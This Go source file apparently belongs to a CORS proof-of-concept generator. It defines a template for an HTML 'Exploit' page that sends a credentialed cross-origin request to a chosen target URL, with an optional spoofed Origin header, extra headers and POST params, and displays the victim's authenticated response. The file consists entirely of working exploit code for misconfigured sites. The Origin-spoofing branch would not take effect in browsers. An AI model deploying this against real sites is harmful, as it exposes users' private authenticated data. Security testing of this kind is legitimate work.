package templates

var (
    POC = `<!DOCTYPE html>
    <html>
    <head>
        <script>
            function cors() {
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        alert(this.responseText);
                    }
                };
        
                {{ if .CustomOrigin }}
                // Custom origin is provided, set the Origin header accordingly.
                xhttp.open('{{ .Method }}', '{{ .TargetURL }}', true);
                xhttp.setRequestHeader('Origin', '{{ .CustomOrigin }}');
                {{ else }}
                // Default setup without custom origin.
                xhttp.open('{{ .Method }}', '{{ .TargetURL }}', true);
                {{ end }}
        
                // Setting withCredentials to true to include credentials in the request.
                xhttp.withCredentials = true;
        
                // Conditionally set the request header if specified.
                {{ if .SetRequestHeader }}
                var headerParts = '{{ .SetRequestHeader }}'.split(':');
                if(headerParts.length === 2) {
                    xhttp.setRequestHeader(headerParts[0].trim(), headerParts[1].trim());
                }
                {{ end }}
        
                // Send the request with or without params based on the method.
                xhttp.send({{ if eq .Method "POST" }}'{{ .Params }}'{{ else }}null{{ end }});
            }
        </script>
        
    </head>
    <body>
    <center>
    <h2>CORS PoC Generator</h2>
    <h3>Exploit</h3>
    <div id="demo">
    <button type="button" onclick="cors()">Exploit</button>
    </div>
    </center>
    </body>
    </html>
    `
)